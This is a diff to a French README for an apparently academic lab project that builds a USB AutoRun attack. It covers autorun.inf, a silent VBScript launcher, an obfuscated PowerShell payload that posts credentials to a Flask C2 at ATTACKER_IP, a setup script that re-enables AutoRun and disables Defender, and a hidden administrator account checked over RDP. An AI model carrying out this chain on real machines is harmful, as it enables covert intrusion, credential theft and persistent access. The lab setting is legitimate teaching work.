@@ -49,7 +49,7 @@ Ce TP a pour objectif de comprendre et de mettre en pratique les mécanismes d'a
 
 | Contrainte du sujet | Solution adoptée |
 |---------------------|-----------------|
-| Déclenchement automatique, sans interaction utilisateur | AutoRun via `autorun.inf` + `launcher.vbs` |
+| Déclenchement automatique, sans interaction utilisateur | AutoRun via `autorun.inf` + `launcher.vbs` (machine cible préparée avec `setup_target.ps1`) |
 | Support de stockage USB ordinaire (flash disk standard) | Aucun matériel spécifique (pas de Rubber Ducky, pas de microcontrôleur) |
 | Émulation clavier (BadUSB) interdite | Non utilisée ; exploitation d'AutoRun Windows |
 | Transmission des informations via canal réseau réel | HTTP POST JSON vers un serveur Flask (canal réseau réel) |
@@ -66,7 +66,8 @@ Projet_BadUSB_Attack/
 │   │   ├── autorun.inf           # Fichier de déclenchement AutoRun
 │   │   ├── launcher.vbs          # Lanceur VBScript silencieux
 │   │   ├── payload.ps1           # Charge utile principale (version lisible)
-│   │   └── payload_obfusque.ps1  # Version obfusquée (évasion antivirus)
+│   │   ├── payload_obfusque.ps1  # Version obfusquée (évasion antivirus)
+│   │   └── setup_target.ps1      # Préparation machine cible (réactivation AutoRun)
 │   └── serveur_c2/
 │       ├── server.py             # Serveur C2 Flask (côté attaquant)
 │       └── requirements.txt      # Dépendances Python
@@ -115,20 +116,39 @@ Projet_BadUSB_Attack/
 
 ### 3.1 Mécanisme de déclenchement automatique
 
-Le déclenchement repose sur la fonctionnalité **AutoRun** de Windows, activée par défaut sur Windows XP/7 et configurable via la base de registre ou les GPO sur Windows 10/11.
+Le déclenchement repose sur la fonctionnalité **AutoRun** de Windows, activée via la clé de registre `NoDriveTypeAutoRun = 0x00`. Le déploiement se fait en deux étapes :
+
+#### Étape A – Préparation de la machine cible (`setup_target.ps1`)
+
+Ce script est exécuté **une fois** sur la machine cible par l'encadrant ou l'étudiant avant la démonstration. Il remet la machine dans l'état de configuration qui exploite la vulnérabilité AutoRun (MITRE ATT&CK T1091) :
+
+| Action | Détail technique |
+|---|---|
+| `NoDriveTypeAutoRun = 0x00` | Réactive AutoRun pour tous les lecteurs dans `HKLM` et `HKCU` |
+| Suppression du handler AutoPlay | Efface `StorageOnArrival` pour que `autorun.inf` soit prioritaire |
+| Service `ShellHWDetection` | Redémarre le service requis pour la détection AutoRun |
+| Windows Defender désactivé | `Set-MpPreference -DisableRealtimeMonitoring $true` |
+| Redémarrage Explorateur | Applique les changements sans reboot complet |
+
+```powershell
+# Exécuter une fois sur la machine cible (en tant qu'Administrateur)
+powershell -ExecutionPolicy Bypass -File setup_target.ps1
+```
+
+#### Étape B – Insertion de la clé USB
+
+Une fois la machine cible préparée, l'insertion de la clé USB déclenche automatiquement la chaîne d'exécution :
 
 **Fichier `autorun.inf`** (racine de la clé USB) :
 
 ```ini
 [autorun]
 open=launcher.vbs
-shellexecute=launcher.vbs
-action=Ouvrir le dossier pour afficher les fichiers
 icon=shell32.dll,8
 label=USB Stockage
 ```
 
-Les directives `open` et `shellexecute` pointent toutes deux vers `launcher.vbs` pour maximiser les chances d'exécution selon la version de Windows et sa configuration. Le `label` et l'`icon` sont choisis pour imiter une clé USB standard et ne pas éveiller les soupçons.
+La directive `open=launcher.vbs` est la seule nécessaire : dès l'insertion, Windows lit `autorun.inf` et exécute `launcher.vbs` **sans aucune interaction de l'utilisateur**.
 
 **Fichier `launcher.vbs`** :
 
@@ -528,32 +548,45 @@ Si plusieurs indicateurs sont présents simultanément, le processus est consid�
 
 | Rôle | Machine | OS |
 |---|---|---|
-| Victime | VM 1 | Windows 10/11 Pro (AutoRun activé) |
+| Victime | VM 1 | Windows 10/11 Pro |
 | Attaquant | Machine hôte ou VM 2 | Linux / Windows (serveur C2) |
 
 ### Étapes de démonstration – Attaque (Partie 1)
 
-1. **Préparation de la clé USB**
-   - Copier `autorun.inf`, `launcher.vbs` et `payload.ps1` à la racine de la clé USB.
-   - Remplacer `ATTACKER_IP` dans `payload.ps1` par l'IP réelle du serveur C2.
+#### Étape A – Préparation de la machine cible (une fois, avant la démo)
 
-2. **Démarrage du serveur C2**
-   ```bash
-   cd partie1/serveur_c2
-   pip install -r requirements.txt
-   python server.py --host 0.0.0.0 --port 8080
+1. Sur la machine victime (VM 1), ouvrir PowerShell **en tant qu'Administrateur**.
+2. Exécuter `setup_target.ps1` :
+   ```powershell
+   powershell -ExecutionPolicy Bypass -File setup_target.ps1
    ```
+   Le script réactive AutoRun, démarre `ShellHWDetection` et désactive Defender.
+   Un message de confirmation s'affiche : *« Machine cible prête pour la démonstration »*.
 
-3. **Insertion de la clé USB** dans la machine victime (Windows 10/11).
+#### Étape B – Préparation de la clé USB
 
-4. **Observation** : dans les 15 secondes suivant l'insertion :
+1. Copier `autorun.inf`, `launcher.vbs` et `payload.ps1` à la racine de la clé USB.
+2. Remplacer `ATTACKER_IP` dans `payload.ps1` par l'IP réelle du serveur C2.
+
+#### Étape C – Démarrage du serveur C2
+
+```bash
+cd partie1/serveur_c2
+pip install -r requirements.txt
+python server.py --host 0.0.0.0 --port 8080
+```
+
+#### Étape D – Démonstration
+
+1. **Insertion de la clé USB** dans la machine victime (VM 1).
+2. **Observation** : dans les 15 secondes suivant l'insertion, sans aucun clic :
    - Aucune fenêtre n'apparaît sur la machine victime.
    - Le serveur C2 affiche dans sa console : `Nouvelle cible : DESKTOP-XXXX ...`
    - La page `http://ATTACKER_IP:8080/status` affiche les identifiants reçus.
 
-5. **Retrait de la clé USB** après ≤ 15 secondes.
+3. **Retrait de la clé USB** après ≤ 15 secondes.
 
-6. **Vérification de la compromission** :
+4. **Vérification de la compromission** :
    ```
    # Connexion RDP
    mstsc /v:<IP_PUBLIQUE>:3389
@@ -580,7 +613,7 @@ Si plusieurs indicateurs sont présents simultanément, le processus est consid�
 
 | Exigence du sujet | Statut | Solution technique |
 |---|:---:|---|
-| Déclenchement sans interaction utilisateur | ✅ | `autorun.inf` + `launcher.vbs` (WindowStyle=0, async) |
+| Déclenchement sans interaction utilisateur | ✅ | `autorun.inf` + `launcher.vbs` (WindowStyle=0, async) sur machine préparée avec `setup_target.ps1` |
 | Flash disk ordinaire, sans matériel spécifique | ✅ | Clé USB standard, aucun microcontrôleur |
 | Émulation clavier interdite – non utilisée | ✅ | Exploitation d'AutoRun uniquement |
 | Créer un compte administrateur | ✅ | `net user svc_XXXX ... /add` + `net localgroup Administrators` |
